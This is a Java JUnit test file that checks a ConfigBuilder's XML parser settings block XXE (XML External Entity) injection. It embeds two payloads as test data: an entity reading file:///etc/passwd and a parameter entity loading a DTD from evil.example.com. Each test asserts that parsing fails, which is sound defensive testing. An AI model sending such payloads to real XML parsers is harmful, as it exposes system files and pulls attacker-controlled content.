import com.rocketride.tika_api.*;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeAll;
import static org.junit.jupiter.api.Assertions.*;

import java.io.ByteArrayInputStream;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.xml.sax.SAXParseException;

/**
 * Tests that ConfigBuilder's DocumentBuilderFactory settings reject XML
 * External Entity (XXE) injection payloads.
 *
 * The XXE protection in ConfigBuilder sets:
 *   - disallow-doctype-decl = true
 *   - external-general-entities = false
 *   - external-parameter-entities = false
 *
 * These tests verify that:
 *   1. Normal config loading still works (regression).
 *   2. XML containing a DOCTYPE/entity declaration is rejected.
 */
class TestConfigBuilderXXE {

    @BeforeAll
    static void setup() {
        TikaApi.rootPath = System.getProperty("user.dir");
    }

    /**
     * Smoke / regression test: ConfigBuilder.getConfig() should succeed
     * when given a well-formed tika-config.xml with no DOCTYPE.
     */
    @Test
    void testGetConfigSucceedsWithValidXml() throws Exception {
        assertDoesNotThrow(() -> {
            var config = ConfigBuilder.getConfig();
            assertNotNull(config, "TikaConfig should not be null");
        });
    }

    /**
     * Verify that a DocumentBuilderFactory configured with the same XXE
     * protection flags used in ConfigBuilder rejects an XML document that
     * contains a DOCTYPE declaration with an external entity.
     *
     * This is the core security assertion requested by reviewers: the
     * parser must throw when it encounters an entity-injection payload.
     */
    @Test
    void testParserRejectsXxePayload() throws Exception {
        // Mirror the exact factory configuration from ConfigBuilder.getConfig()
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setNamespaceAware(true);
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        DocumentBuilder db = dbf.newDocumentBuilder();

        // Classic XXE payload that attempts to read /etc/passwd
        String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<!DOCTYPE foo [\n"
                + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
                + "]>\n"
                + "<properties><parsers>&xxe;</parsers></properties>";

        ByteArrayInputStream input = new ByteArrayInputStream(xxePayload.getBytes("UTF-8"));

        // The disallow-doctype-decl feature must cause the parser to throw
        assertThrows(SAXParseException.class, () -> db.parse(input),
                "Parser should reject XML containing a DOCTYPE declaration");
    }

    /**
     * Verify rejection of a parameter-entity XXE variant as well.
     */
    @Test
    void testParserRejectsParameterEntityXxe() throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setNamespaceAware(true);
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        DocumentBuilder db = dbf.newDocumentBuilder();

        // Parameter-entity variant
        String paramEntityPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<!DOCTYPE foo [\n"
                + "  <!ENTITY % xxe SYSTEM \"http://evil.example.com/payload.dtd\">\n"
                + "  %xxe;\n"
                + "]>\n"
                + "<properties></properties>";

        ByteArrayInputStream input = new ByteArrayInputStream(paramEntityPayload.getBytes("UTF-8"));

        assertThrows(SAXParseException.class, () -> db.parse(input),
                "Parser should reject XML containing a parameter entity in DOCTYPE");
    }
}
